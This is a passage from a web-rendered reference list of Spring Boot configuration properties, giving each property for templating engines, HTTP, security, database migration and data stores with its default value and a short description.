and later location headers generated by a call to sendRedirect will use relative or absolute redirects.</span><br><span class="line">server.undertow.accesslog.dir= # Undertow access log directory.</span><br><span class="line">server.undertow.accesslog.enabled=false # Whether to enable the access log.</span><br><span class="line">server.undertow.accesslog.pattern=common # Format pattern for access logs.</span><br><span class="line">server.undertow.accesslog.prefix=access_log. # Log file name prefix.</span><br><span class="line">server.undertow.accesslog.rotate=true # Whether to enable access log rotation.</span><br><span class="line">server.undertow.accesslog.suffix=log # Log file name suffix.</span><br><span class="line">server.undertow.buffer-size= # Size of each buffer, in bytes.</span><br><span class="line">server.undertow.direct-buffers= # Whether to allocate buffers outside the Java heap.</span><br><span class="line">server.undertow.io-threads= # Number of I/O threads to create for the worker.</span><br><span class="line">server.undertow.eager-filter-init=true # Whether servlet filters should be initialized on startup.</span><br><span class="line">server.undertow.max-http-post-size=0 # Maximum size, in bytes, of the HTTP post content.</span><br><span class="line">server.undertow.worker-threads= # Number of worker threads.</span><br><span class="line"></span><br><span class="line"># FREEMARKER (FreeMarkerProperties)</span><br><span class="line">spring.freemarker.allow-request-override=false # Whether HttpServletRequest attributes are allowed to override (hide) controller generated model attributes of the same name.</span><br><span class="line">spring.freemarker.allow-session-override=false # Whether HttpSession attributes are allowed to override (hide) controller generated model attributes of the same name.</span><br><span class="line">spring.freemarker.cache=false # Whether to enable template caching.</span><br><span class="line">spring.freemarker.charset=UTF-8 # Template encoding.</span><br><span class="line">spring.freemarker.check-template-location=true # Whether to check that the templates location exists.</span><br><span class="line">spring.freemarker.content-type=text/html # Content-Type value.</span><br><span class="line">spring.freemarker.enabled=true # Whether to enable MVC view resolution for this technology.</span><br><span class="line">spring.freemarker.expose-request-attributes=false # Whether all request attributes should be added to the model prior to merging with the template.</span><br><span class="line">spring.freemarker.expose-session-attributes=false # Whether all HttpSession attributes should be added to the model prior to merging with the template.</span><br><span class="line">spring.freemarker.expose-spring-macro-helpers=true # Whether to expose a RequestContext for use by Spring&apos;s macro library, under the name &quot;springMacroRequestContext&quot;.</span><br><span class="line">spring.freemarker.prefer-file-system-access=true # Whether to prefer file system access for template loading. File system access enables hot detection of template changes.</span><br><span class="line">spring.freemarker.prefix= # Prefix that gets prepended to view names when building a URL.</span><br><span class="line">spring.freemarker.request-context-attribute= # Name of the RequestContext attribute for all views.</span><br><span class="line">spring.freemarker.settings.*= # Well-known FreeMarker keys which are passed to FreeMarker&apos;s Configuration.</span><br><span class="line">spring.freemarker.suffix=.ftl # Suffix that gets appended to view names when building a URL.</span><br><span class="line">spring.freemarker.template-loader-path=classpath:/templates/ # Comma-separated list of template paths.</span><br><span class="line">spring.freemarker.view-names= # White list of view names that can be resolved.</span><br><span class="line"></span><br><span class="line"># GROOVY TEMPLATES (GroovyTemplateProperties)</span><br><span class="line">spring.groovy.template.allow-request-override=false # Whether HttpServletRequest attributes are allowed to override (hide) controller generated model attributes of the same name.</span><br><span class="line">spring.groovy.template.allow-session-override=false # Whether HttpSession attributes are allowed to override (hide) controller generated model attributes of the same name.</span><br><span class="line">spring.groovy.template.cache=false # Whether to enable template caching.</span><br><span class="line">spring.groovy.template.charset=UTF-8 # Template encoding.</span><br><span class="line">spring.groovy.template.check-template-location=true # Whether to check that the templates location exists.</span><br><span class="line">spring.groovy.template.configuration.*= # See GroovyMarkupConfigurer</span><br><span class="line">spring.groovy.template.content-type=text/html # Content-Type value.</span><br><span class="line">spring.groovy.template.enabled=true # Whether to enable MVC view resolution for this technology.</span><br><span class="line">spring.groovy.template.expose-request-attributes=false # Whether all request attributes should be added to the model prior to merging with the template.</span><br><span class="line">spring.groovy.template.expose-session-attributes=false # Whether all HttpSession attributes should be added to the model prior to merging with the template.</span><br><span class="line">spring.groovy.template.expose-spring-macro-helpers=true # Whether to expose a RequestContext for use by Spring&apos;s macro library, under the name &quot;springMacroRequestContext&quot;.</span><br><span class="line">spring.groovy.template.prefix= # Prefix that gets prepended to view names when building a URL.</span><br><span class="line">spring.groovy.template.request-context-attribute= # Name of the RequestContext attribute for all views.</span><br><span class="line">spring.groovy.template.resource-loader-path=classpath:/templates/ # Template path.</span><br><span class="line">spring.groovy.template.suffix=.tpl # Suffix that gets appended to view names when building a URL.</span><br><span class="line">spring.groovy.template.view-names= # White list of view names that can be resolved.</span><br><span class="line"></span><br><span class="line"># SPRING HATEOAS (HateoasProperties)</span><br><span class="line">spring.hateoas.use-hal-as-default-json-media-type=true # Whether application/hal+json responses should be sent to requests that accept application/json.</span><br><span class="line"></span><br><span class="line"># HTTP message conversion</span><br><span class="line">spring.http.converters.preferred-json-mapper= # Preferred JSON mapper to use for HTTP message conversion. By default, auto-detected according to the environment.</span><br><span class="line"></span><br><span class="line"># HTTP encoding (HttpEncodingProperties)</span><br><span class="line">spring.http.encoding.charset=UTF-8 # Charset of HTTP requests and responses. Added to the &quot;Content-Type&quot; header if not set explicitly.</span><br><span class="line">spring.http.encoding.enabled=true # Whether to enable http encoding support.</span><br><span class="line">spring.http.encoding.force= # Whether to force the encoding to the configured charset on HTTP requests and responses.</span><br><span class="line">spring.http.encoding.force-request= # Whether to force the encoding to the configured charset on HTTP requests. Defaults to true when &quot;force&quot; has not been specified.</span><br><span class="line">spring.http.encoding.force-response= # Whether to force the encoding to the configured charset on HTTP responses.</span><br><span class="line">spring.http.encoding.mapping= # Locale in which to encode mapping.</span><br><span class="line"></span><br><span class="line"># MULTIPART (MultipartProperties)</span><br><span class="line">spring.servlet.multipart.enabled=true # Whether to enable support of multipart uploads.</span><br><span class="line">spring.servlet.multipart.file-size-threshold=0 # Threshold after which files are written to disk. Values can use the suffixes &quot;MB&quot; or &quot;KB&quot; to indicate megabytes or kilobytes, respectively.</span><br><span class="line">spring.servlet.multipart.location= # Intermediate location of uploaded files.</span><br><span class="line">spring.servlet.multipart.max-file-size=1MB # Max file size. Values can use the suffixes &quot;MB&quot; or &quot;KB&quot; to indicate megabytes or kilobytes, respectively.</span><br><span class="line">spring.servlet.multipart.max-request-size=10MB # Max request size. Values can use the suffixes &quot;MB&quot; or &quot;KB&quot; to indicate megabytes or kilobytes, respectively.</span><br><span class="line">spring.servlet.multipart.resolve-lazily=false # Whether to resolve the multipart request lazily at the time of file or parameter access.</span><br><span class="line"></span><br><span class="line"># JACKSON (JacksonProperties)</span><br><span class="line">spring.jackson.date-format= # Date format string or a fully-qualified date format class name. For instance, `yyyy-MM-dd HH:mm:ss`.</span><br><span class="line">spring.jackson.default-property-inclusion= # Controls the inclusion of properties during serialization. Configured with one of the values in Jackson&apos;s JsonInclude.Include enumeration.</span><br><span class="line">spring.jackson.deserialization.*= # Jackson on/off features that affect the way Java objects are deserialized.</span><br><span class="line">spring.jackson.generator.*= # Jackson on/off features for generators.</span><br><span class="line">spring.jackson.joda-date-time-format= # Joda date time format string. If not configured, &quot;date-format&quot; is used as a fallback if it is configured with a format string.</span><br><span class="line">spring.jackson.locale= # Locale used for formatting.</span><br><span class="line">spring.jackson.mapper.*= # Jackson general purpose on/off features.</span><br><span class="line">spring.jackson.parser.*= # Jackson on/off features for parsers.</span><br><span class="line">spring.jackson.property-naming-strategy= # One of the constants on Jackson&apos;s PropertyNamingStrategy. Can also be a fully-qualified class name of a PropertyNamingStrategy subclass.</span><br><span class="line">spring.jackson.serialization.*= # Jackson on/off features that affect the way Java objects are serialized.</span><br><span class="line">spring.jackson.time-zone= #  Time zone used when formatting dates. For instance, &quot;America/Los_Angeles&quot; or &quot;GMT+10&quot;.</span><br><span class="line"></span><br><span class="line"># GSON (GsonProperties)</span><br><span class="line">spring.gson.date-format= # Format to use when serializing Date objects.</span><br><span class="line">spring.gson.disable-html-escaping= # Whether to disable the escaping of HTML characters such as &apos;&lt;&apos;, &apos;&gt;&apos;, etc.</span><br><span class="line">spring.gson.disable-inner-class-serialization= # Whether to exclude inner classes during serialization.</span><br><span class="line">spring.gson.enable-complex-map-key-serialization= # Whether to enable serialization of complex map keys (i.e. non-primitives).</span><br><span class="line">spring.gson.exclude-fields-without-expose-annotation= # Whether to exclude all fields from consideration for serialization or deserialization that do not have the &quot;Expose&quot; annotation.</span><br><span class="line">spring.gson.field-naming-policy= # Naming policy that should be applied to an object&apos;s field during serialization and deserialization.</span><br><span class="line">spring.gson.generate-non-executable-json= # Whether to generate non executable JSON by prefixing the output with some special text.</span><br><span class="line">spring.gson.lenient= # Whether to be lenient about parsing JSON that doesn&apos;t conform to RFC 4627.</span><br><span class="line">spring.gson.long-serialization-policy= # Serialization policy for Long and long types.</span><br><span class="line">spring.gson.pretty-printing= # Whether to output serialized JSON that fits in a page for pretty printing.</span><br><span class="line">spring.gson.serialize-nulls= # Whether to serialize null fields.</span><br><span class="line"></span><br><span class="line"># JERSEY (JerseyProperties)</span><br><span class="line">spring.jersey.application-path= # Path that serves as the base URI for the application. If specified, overrides the value of &quot;@ApplicationPath&quot;.</span><br><span class="line">spring.jersey.filter.order=0 # Jersey filter chain order.</span><br><span class="line">spring.jersey.init.*= # Init parameters to pass to Jersey through the servlet or filter.</span><br><span class="line">spring.jersey.servlet.load-on-startup=-1 # Load on startup priority of the Jersey servlet.</span><br><span class="line">spring.jersey.type=servlet # Jersey integration type.</span><br><span class="line"></span><br><span class="line"># SPRING LDAP (LdapProperties)</span><br><span class="line">spring.ldap.anonymous-read-only=false # Whether read-only operations should use an anonymous environment.</span><br><span class="line">spring.ldap.base= # Base suffix from which all operations should originate.</span><br><span class="line">spring.ldap.base-environment.*= # LDAP specification settings.</span><br><span class="line">spring.ldap.password= # Login password of the server.</span><br><span class="line">spring.ldap.urls= # LDAP URLs of the server.</span><br><span class="line">spring.ldap.username= # Login username of the server.</span><br><span class="line"></span><br><span class="line"># EMBEDDED LDAP (EmbeddedLdapProperties)</span><br><span class="line">spring.ldap.embedded.base-dn= # List of base DNs.</span><br><span class="line">spring.ldap.embedded.credential.username= # Embedded LDAP username.</span><br><span class="line">spring.ldap.embedded.credential.password= # Embedded LDAP password.</span><br><span class="line">spring.ldap.embedded.ldif=classpath:schema.ldif # Schema (LDIF) script resource reference.</span><br><span class="line">spring.ldap.embedded.port=0 # Embedded LDAP port.</span><br><span class="line">spring.ldap.embedded.validation.enabled=true # Whether to enable LDAP schema validation.</span><br><span class="line">spring.ldap.embedded.validation.schema= # Path to the custom schema.</span><br><span class="line"></span><br><span class="line"># MUSTACHE TEMPLATES (MustacheAutoConfiguration)</span><br><span class="line">spring.mustache.allow-request-override=false # Whether HttpServletRequest attributes are allowed to override (hide) controller generated model attributes of the same name.</span><br><span class="line">spring.mustache.allow-session-override=false # Whether HttpSession attributes are allowed to override (hide) controller generated model attributes of the same name.</span><br><span class="line">spring.mustache.cache=false # Whether to enable template caching.</span><br><span class="line">spring.mustache.charset=UTF-8 # Template encoding.</span><br><span class="line">spring.mustache.check-template-location=true # Whether to check that the templates location exists.</span><br><span class="line">spring.mustache.content-type=text/html # Content-Type value.</span><br><span class="line">spring.mustache.enabled=true # Whether to enable MVC view resolution for this technology.</span><br><span class="line">spring.mustache.expose-request-attributes=false # Whether all request attributes should be added to the model prior to merging with the template.</span><br><span class="line">spring.mustache.expose-session-attributes=false # Whether all HttpSession attributes should be added to the model prior to merging with the template.</span><br><span class="line">spring.mustache.expose-spring-macro-helpers=true # Whether to expose a RequestContext for use by Spring&apos;s macro library, under the name &quot;springMacroRequestContext&quot;.</span><br><span class="line">spring.mustache.prefix=classpath:/templates/ # Prefix to apply to template names.</span><br><span class="line">spring.mustache.request-context-attribute= # Name of the RequestContext attribute for all views.</span><br><span class="line">spring.mustache.suffix=.mustache # Suffix to apply to template names.</span><br><span class="line">spring.mustache.view-names= # White list of view names that can be resolved.</span><br><span class="line"></span><br><span class="line"># SPRING MVC (WebMvcProperties)</span><br><span class="line">spring.mvc.async.request-timeout= # Amount of time before asynchronous request handling times out.</span><br><span class="line">spring.mvc.contentnegotiation.favor-parameter=false # Whether a request parameter (&quot;format&quot; by default) should be used to determine the requested media type.</span><br><span class="line">spring.mvc.contentnegotiation.favor-path-extension=false # Whether the path extension in the URL path should be used to determine the requested media type.</span><br><span class="line">spring.mvc.contentnegotiation.media-types.*= # Map file extensions to media types for content negotiation. For instance, yml to text/yaml.</span><br><span class="line">spring.mvc.contentnegotiation.parameter-name= # Query parameter name to use when &quot;favor-parameter&quot; is enabled.</span><br><span class="line">spring.mvc.date-format= # Date format to use. For instance, `dd/MM/yyyy`.</span><br><span class="line">spring.mvc.dispatch-trace-request=false # Whether to dispatch TRACE requests to the FrameworkServlet doService method.</span><br><span class="line">spring.mvc.dispatch-options-request=true # Whether to dispatch OPTIONS requests to the FrameworkServlet doService method.</span><br><span class="line">spring.mvc.favicon.enabled=true # Whether to enable resolution of favicon.ico.</span><br><span class="line">spring.mvc.formcontent.putfilter.enabled=true # Whether to enable Spring&apos;s HttpPutFormContentFilter.</span><br><span class="line">spring.mvc.ignore-default-model-on-redirect=true # Whether the content of the &quot;default&quot; model should be ignored during redirect scenarios.</span><br><span class="line">spring.mvc.locale= # Locale to use. By default, this locale is overridden by the &quot;Accept-Language&quot; header.</span><br><span class="line">spring.mvc.locale-resolver=accept-header # Define how the locale should be resolved.</span><br><span class="line">spring.mvc.log-resolved-exception=false # Whether to enable warn logging of exceptions resolved by a &quot;HandlerExceptionResolver&quot;.</span><br><span class="line">spring.mvc.message-codes-resolver-format= # Formatting strategy for message codes. For instance, `PREFIX_ERROR_CODE`.</span><br><span class="line">spring.mvc.pathmatch.use-registered-suffix-pattern=false # Whether suffix pattern matching should work only against extensions registered with &quot;spring.mvc.contentnegotiation.media-types.*&quot;.</span><br><span class="line">spring.mvc.pathmatch.use-suffix-pattern=false # Whether to use suffix pattern match (&quot;.*&quot;) when matching patterns to requests.</span><br><span class="line">spring.mvc.servlet.load-on-startup=-1 # Load on startup priority of the dispatcher servlet.</span><br><span class="line">spring.mvc.static-path-pattern=/** # Path pattern used for static resources.</span><br><span class="line">spring.mvc.throw-exception-if-no-handler-found=false # Whether a &quot;NoHandlerFoundException&quot; should be thrown if no Handler was found to process a request.</span><br><span class="line">spring.mvc.view.prefix= # Spring MVC view prefix.</span><br><span class="line">spring.mvc.view.suffix= # Spring MVC view suffix.</span><br><span class="line"></span><br><span class="line"># SPRING RESOURCES HANDLING (ResourceProperties)</span><br><span class="line">spring.resources.add-mappings=true # Whether to enable default resource handling.</span><br><span class="line">spring.resources.cache.cachecontrol.cache-private= # Indicate that the response message is intended for a single user and must not be stored by a shared cache.</span><br><span class="line">spring.resources.cache.cachecontrol.cache-public= # Indicate that any cache may store the response.</span><br><span class="line">spring.resources.cache.cachecontrol.max-age= # Maximum time the response should be cached, in seconds if no duration suffix is not specified.</span><br><span class="line">spring.resources.cache.cachecontrol.must-revalidate= # Indicate that once it has become stale, a cache must not use the response without re-validating it with the server.</span><br><span class="line">spring.resources.cache.cachecontrol.no-cache= # Indicate that the cached response can be reused only if re-validated with the server.</span><br><span class="line">spring.resources.cache.cachecontrol.no-store= # Indicate to not cache the response in any case.</span><br><span class="line">spring.resources.cache.cachecontrol.no-transform= # Indicate intermediaries (caches and others) that they should not transform the response content.</span><br><span class="line">spring.resources.cache.cachecontrol.proxy-revalidate= # Same meaning as the &quot;must-revalidate&quot; directive, except that it does not apply to private caches.</span><br><span class="line">spring.resources.cache.cachecontrol.s-max-age= # Maximum time the response should be cached by shared caches, in seconds if no duration suffix is not specified.</span><br><span class="line">spring.resources.cache.cachecontrol.stale-if-error= # Maximum time the response may be used when errors are encountered, in seconds if no duration suffix is not specified.</span><br><span class="line">spring.resources.cache.cachecontrol.stale-while-revalidate= # Maximum time the response can be served after it becomes stale, in seconds if no duration suffix is not specified.</span><br><span class="line">spring.resources.cache.period= # Cache period for the resources served by the resource handler. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.resources.chain.cache=true # Whether to enable caching in the Resource chain.</span><br><span class="line">spring.resources.chain.enabled= # Whether to enable the Spring Resource Handling chain. By default, disabled unless at least one strategy has been enabled.</span><br><span class="line">spring.resources.chain.gzipped=false # Whether to enable resolution of already gzipped resources.</span><br><span class="line">spring.resources.chain.html-application-cache=false # Whether to enable HTML5 application cache manifest rewriting.</span><br><span class="line">spring.resources.chain.strategy.content.enabled=false # Whether to enable the content Version Strategy.</span><br><span class="line">spring.resources.chain.strategy.content.paths=/** # Comma-separated list of patterns to apply to the content Version Strategy.</span><br><span class="line">spring.resources.chain.strategy.fixed.enabled=false # Whether to enable the fixed Version Strategy.</span><br><span class="line">spring.resources.chain.strategy.fixed.paths=/** # Comma-separated list of patterns to apply to the fixed Version Strategy.</span><br><span class="line">spring.resources.chain.strategy.fixed.version= # Version string to use for the fixed Version Strategy.</span><br><span class="line">spring.resources.static-locations=classpath:/META-INF/resources/,classpath:/resources/,classpath:/static/,classpath:/public/ # Locations of static resources.</span><br><span class="line"></span><br><span class="line"># SPRING SESSION (SessionProperties)</span><br><span class="line">spring.session.store-type= # Session store type.</span><br><span class="line">spring.session.servlet.filter-order=-2147483598 # Session repository filter order.</span><br><span class="line">spring.session.servlet.filter-dispatcher-types=async,error,request # Session repository filter dispatcher types.</span><br><span class="line"></span><br><span class="line"># SPRING SESSION HAZELCAST (HazelcastSessionProperties)</span><br><span class="line">spring.session.hazelcast.flush-mode=on-save # Sessions flush mode.</span><br><span class="line">spring.session.hazelcast.map-name=spring:session:sessions # Name of the map used to store sessions.</span><br><span class="line"></span><br><span class="line"># SPRING SESSION JDBC (JdbcSessionProperties)</span><br><span class="line">spring.session.jdbc.cleanup-cron=0 * * * * * # Cron expression for expired session cleanup job.</span><br><span class="line">spring.session.jdbc.initialize-schema=embedded # Database schema initialization mode.</span><br><span class="line">spring.session.jdbc.schema=classpath:org/springframework/session/jdbc/schema-@@platform@@.sql # Path to the SQL file to use to initialize the database schema.</span><br><span class="line">spring.session.jdbc.table-name=SPRING_SESSION # Name of the database table used to store sessions.</span><br><span class="line"></span><br><span class="line"># SPRING SESSION MONGODB (MongoSessionProperties)</span><br><span class="line">spring.session.mongodb.collection-name=sessions # Collection name used to store sessions.</span><br><span class="line"></span><br><span class="line"># SPRING SESSION REDIS (RedisSessionProperties)</span><br><span class="line">spring.session.redis.cleanup-cron=0 * * * * * # Cron expression for expired session cleanup job.</span><br><span class="line">spring.session.redis.flush-mode=on-save # Sessions flush mode.</span><br><span class="line">spring.session.redis.namespace=spring:session # Namespace for keys used to store sessions.</span><br><span class="line"></span><br><span class="line"># THYMELEAF (ThymeleafAutoConfiguration)</span><br><span class="line">spring.thymeleaf.cache=true # Whether to enable template caching.</span><br><span class="line">spring.thymeleaf.check-template=true # Whether to check that the template exists before rendering it.</span><br><span class="line">spring.thymeleaf.check-template-location=true # Whether to check that the templates location exists.</span><br><span class="line">spring.thymeleaf.enabled=true # Whether to enable Thymeleaf view resolution for Web frameworks.</span><br><span class="line">spring.thymeleaf.enable-spring-el-compiler=false # Enable the SpringEL compiler in SpringEL expressions.</span><br><span class="line">spring.thymeleaf.encoding=UTF-8 # Template files encoding.</span><br><span class="line">spring.thymeleaf.excluded-view-names= # Comma-separated list of view names (patterns allowed) that should be excluded from resolution.</span><br><span class="line">spring.thymeleaf.mode=HTML # Template mode to be applied to templates. See also Thymeleaf&apos;s TemplateMode enum.</span><br><span class="line">spring.thymeleaf.prefix=classpath:/templates/ # Prefix that gets prepended to view names when building a URL.</span><br><span class="line">spring.thymeleaf.reactive.chunked-mode-view-names= # Comma-separated list of view names (patterns allowed) that should be the only ones executed in CHUNKED mode when a max chunk size is set.</span><br><span class="line">spring.thymeleaf.reactive.full-mode-view-names= # Comma-separated list of view names (patterns allowed) that should be executed in FULL mode even if a max chunk size is set.</span><br><span class="line">spring.thymeleaf.reactive.max-chunk-size=0 # Maximum size of data buffers used for writing to the response, in bytes.</span><br><span class="line">spring.thymeleaf.reactive.media-types= # Media types supported by the view technology.</span><br><span class="line">spring.thymeleaf.servlet.content-type=text/html # Content-Type value written to HTTP responses.</span><br><span class="line">spring.thymeleaf.suffix=.html # Suffix that gets appended to view names when building a URL.</span><br><span class="line">spring.thymeleaf.template-resolver-order= # Order of the template resolver in the chain.</span><br><span class="line">spring.thymeleaf.view-names= # Comma-separated list of view names (patterns allowed) that can be resolved.</span><br><span class="line"></span><br><span class="line"># SPRING WEBFLUX (WebFluxProperties)</span><br><span class="line">spring.webflux.date-format= # Date format to use. For instance, `dd/MM/yyyy`.</span><br><span class="line">spring.webflux.static-path-pattern=/** # Path pattern used for static resources.</span><br><span class="line"></span><br><span class="line"># SPRING WEB SERVICES (WebServicesProperties)</span><br><span class="line">spring.webservices.path=/services # Path that serves as the base URI for the services.</span><br><span class="line">spring.webservices.servlet.init= # Servlet init parameters to pass to Spring Web Services.</span><br><span class="line">spring.webservices.servlet.load-on-startup=-1 # Load on startup priority of the Spring Web Services servlet.</span><br><span class="line">spring.webservices.wsdl-locations= # Comma-separated list of locations of WSDLs and accompanying XSDs to be exposed as beans.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ----------------------------------------</span><br><span class="line"># SECURITY PROPERTIES</span><br><span class="line"># ----------------------------------------</span><br><span class="line"># SECURITY (SecurityProperties)</span><br><span class="line">spring.security.filter.order=-100 # Security filter chain order.</span><br><span class="line">spring.security.filter.dispatcher-types=async,error,request # Security filter chain dispatcher types.</span><br><span class="line">spring.security.user.name=user # Default user name.</span><br><span class="line">spring.security.user.password= # Password for the default user name.</span><br><span class="line">spring.security.user.roles= # Granted roles for the default user name.</span><br><span class="line"></span><br><span class="line"># SECURITY OAUTH2 CLIENT (OAuth2ClientProperties)</span><br><span class="line">spring.security.oauth2.client.provider.*= # OAuth provider details.</span><br><span class="line">spring.security.oauth2.client.registration.*= # OAuth client registrations.</span><br><span class="line"></span><br><span class="line"># ----------------------------------------</span><br><span class="line"># DATA PROPERTIES</span><br><span class="line"># ----------------------------------------</span><br><span class="line"></span><br><span class="line"># FLYWAY (FlywayProperties)</span><br><span class="line">spring.flyway.baseline-description= #</span><br><span class="line">spring.flyway.baseline-on-migrate= #</span><br><span class="line">spring.flyway.baseline-version=1 # Version to start migration</span><br><span class="line">spring.flyway.check-location=true # Whether to check that migration scripts location exists.</span><br><span class="line">spring.flyway.clean-disabled= #</span><br><span class="line">spring.flyway.clean-on-validation-error= #</span><br><span class="line">spring.flyway.dry-run-output= #</span><br><span class="line">spring.flyway.enabled=true # Whether to enable flyway.</span><br><span class="line">spring.flyway.encoding= #</span><br><span class="line">spring.flyway.error-handlers= #</span><br><span class="line">spring.flyway.group= #</span><br><span class="line">spring.flyway.ignore-future-migrations= #</span><br><span class="line">spring.flyway.ignore-missing-migrations= #</span><br><span class="line">spring.flyway.init-sqls= # SQL statements to execute to initialize a connection immediately after obtaining it.</span><br><span class="line">spring.flyway.installed-by= #</span><br><span class="line">spring.flyway.locations=classpath:db/migration # The locations of migrations scripts.</span><br><span class="line">spring.flyway.mixed= #</span><br><span class="line">spring.flyway.out-of-order= #</span><br><span class="line">spring.flyway.password= # JDBC password to use if you want Flyway to create its own DataSource.</span><br><span class="line">spring.flyway.placeholder-prefix= #</span><br><span class="line">spring.flyway.placeholder-replacement= #</span><br><span class="line">spring.flyway.placeholder-suffix= #</span><br><span class="line">spring.flyway.placeholders.*= #</span><br><span class="line">spring.flyway.repeatable-sql-migration-prefix= #</span><br><span class="line">spring.flyway.schemas= # schemas to update</span><br><span class="line">spring.flyway.skip-default-callbacks= #</span><br><span class="line">spring.flyway.skip-default-resolvers= #</span><br><span class="line">spring.flyway.sql-migration-prefix=V #</span><br><span class="line">spring.flyway.sql-migration-separator= #</span><br><span class="line">spring.flyway.sql-migration-suffix=.sql #</span><br><span class="line">spring.flyway.sql-migration-suffixes= #</span><br><span class="line">spring.flyway.table= #</span><br><span class="line">spring.flyway.target= #</span><br><span class="line">spring.flyway.undo-sql-migration-prefix= #</span><br><span class="line">spring.flyway.url= # JDBC url of the database to migrate. If not set, the primary configured data source is used.</span><br><span class="line">spring.flyway.user= # Login user of the database to migrate.</span><br><span class="line">spring.flyway.validate-on-migrate= #</span><br><span class="line"></span><br><span class="line"># LIQUIBASE (LiquibaseProperties)</span><br><span class="line">spring.liquibase.change-log=classpath:/db/changelog/db.changelog-master.yaml # Change log configuration path.</span><br><span class="line">spring.liquibase.check-change-log-location=true # Whether to check that the change log location exists.</span><br><span class="line">spring.liquibase.contexts= # Comma-separated list of runtime contexts to use.</span><br><span class="line">spring.liquibase.default-schema= # Default database schema.</span><br><span class="line">spring.liquibase.drop-first=false # Whether to first drop the database schema.</span><br><span class="line">spring.liquibase.enabled=true # Whether to enable Liquibase support.</span><br><span class="line">spring.liquibase.labels= # Comma-separated list of runtime labels to use.</span><br><span class="line">spring.liquibase.parameters.*= # Change log parameters.</span><br><span class="line">spring.liquibase.password= # Login password of the database to migrate.</span><br><span class="line">spring.liquibase.rollback-file= # File to which rollback SQL is written when an update is performed.</span><br><span class="line">spring.liquibase.url= # JDBC URL of the database to migrate. If not set, the primary configured data source is used.</span><br><span class="line">spring.liquibase.user= # Login user of the database to migrate.</span><br><span class="line"></span><br><span class="line"># COUCHBASE (CouchbaseProperties)</span><br><span class="line">spring.couchbase.bootstrap-hosts= # Couchbase nodes (host or IP address) to bootstrap from.</span><br><span class="line">spring.couchbase.bucket.name=default # Name of the bucket to connect to.</span><br><span class="line">spring.couchbase.bucket.password=  # Password of the bucket.</span><br><span class="line">spring.couchbase.env.endpoints.key-value=1 # Number of sockets per node against the key/value service.</span><br><span class="line">spring.couchbase.env.endpoints.query=1 # Number of sockets per node against the query (N1QL) service.</span><br><span class="line">spring.couchbase.env.endpoints.view=1 # Number of sockets per node against the view service.</span><br><span class="line">spring.couchbase.env.ssl.enabled= # Whether to enable SSL support. Enabled automatically if a &quot;keyStore&quot; is provided unless specified otherwise.</span><br><span class="line">spring.couchbase.env.ssl.key-store= # Path to the JVM key store that holds the certificates.</span><br><span class="line">spring.couchbase.env.ssl.key-store-password= # Password used to access the key store.</span><br><span class="line">spring.couchbase.env.timeouts.connect=5000ms # Bucket connections timeouts.</span><br><span class="line">spring.couchbase.env.timeouts.key-value=2500ms # Blocking operations performed on a specific key timeout.</span><br><span class="line">spring.couchbase.env.timeouts.query=7500ms # N1QL query operations timeout.</span><br><span class="line">spring.couchbase.env.timeouts.socket-connect=1000ms # Socket connect connections timeout.</span><br><span class="line">spring.couchbase.env.timeouts.view=7500ms # Regular and geospatial view operations timeout.</span><br><span class="line"></span><br><span class="line"># DAO (PersistenceExceptionTranslationAutoConfiguration)</span><br><span class="line">spring.dao.exceptiontranslation.enabled=true # Whether to enable the PersistenceExceptionTranslationPostProcessor.</span><br><span class="line"></span><br><span class="line"># CASSANDRA (CassandraProperties)</span><br><span class="line">spring.data.cassandra.cluster-name= # Name of the Cassandra cluster.</span><br><span class="line">spring.data.cassandra.compression=none # Compression supported by the Cassandra binary protocol.</span><br><span class="line">spring.data.cassandra.connect-timeout= # Socket option: connection time out.</span><br><span class="line">spring.data.cassandra.consistency-level= # Queries consistency level.</span><br><span class="line">spring.data.cassandra.contact-points=localhost # Cluster node addresses.</span><br><span class="line">spring.data.cassandra.fetch-size= # Queries default fetch size.</span><br><span class="line">spring.data.cassandra.keyspace-name= # Keyspace name to use.</span><br><span class="line">spring.data.cassandra.load-balancing-policy= # Class name of the load balancing policy.</span><br><span class="line">spring.data.cassandra.port= # Port of the Cassandra server.</span><br><span class="line">spring.data.cassandra.password= # Login password of the server.</span><br><span class="line">spring.data.cassandra.pool.heartbeat-interval=30s # Heartbeat interval after which a message is sent on an idle connection to make sure it&apos;s still alive. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.data.cassandra.pool.idle-timeout=120s # Idle timeout before an idle connection is removed. If a duration suffix is not specified, seconds will be used.</span><br><span class="line">spring.data.cassandra.pool.max-queue-size=256 # Maximum number of requests that get queued if no connection is available.</span><br><span class="line">spring.data.cassandra.pool.pool-timeout=5000ms # Pool timeout when trying to acquire a connection from a host&apos;s pool.</span><br><span class="line">spring.data.cassandra.read-timeout= # Socket option: read time out.</span><br><span class="line">spring.data.cassandra.reconnection-policy= # Reconnection policy class.</span><br><span class="line">spring.data.cassandra.repositories.type=auto # Type of Cassandra repositories to enable.</span><br><span class="line">spring.data.cassandra.retry-policy= # Class name of the retry policy.</span><br><span class="line">spring.data.cassandra.serial-consistency-level= # Queries serial consistency level.</span><br><span class="line">spring.data.cassandra.schema-action=none # Schema action to take at startup.</span><br><span class="line">spring.data.cassandra.ssl=false # Enable SSL support.</span><br><span class="line">spring.data.cassandra.username= # Login user of the server.</span><br><span class="line"></span><br><span class="line"># DATA COUCHBASE (CouchbaseDataProperties)</span><br><span class="line">spring.data.couchbase.auto-index=false # Automatically create views and indexes.</span><br><span class="line">spring.data.couchbase.consistency=read-your-own-writes # Consistency to apply by default on generated queries.</span><br><span class="line">spring.data.couchbase.repositories.type=auto # Type of Couchbase repositories to enable.</span><br><span class="line"></span><br><span class="line"># ELASTICSEARCH (ElasticsearchProperties)</span><br><span class="line">spring.data.elasticsearch.cluster-name=elasticsearch # Elasticsearch cluster name.</span><br><span class="line">spring.data.elasticsearch.cluster-nodes= # Comma-separated list of cluster node addresses.</span><br><span class="line">spring.data.elasticsearch.properties.*= # Additional properties used to configure the client.</span><br><span class="line">spring.data.elasticsearch.repositories.enabled=true # Whether to enable Elasticsearch repositories.</span><br><span class="line"></span><br><span class="line"># DATA LDAP</span><br><span class="line">spring.data.ldap.repositories.enabled=true # Whether to enable LDAP repositories.</span><br><span class="line"></span><br><span class="line"># MONGODB (MongoProperties)</span><br><span class="line">spring.data.mongodb.authentication-database= # Authentication database name.</span><br><span class="line">spring.data.mongodb.database= # Database name.</span><br><span class="line">spring.data.mongodb.field-naming-strategy= # Fully qualified name of the 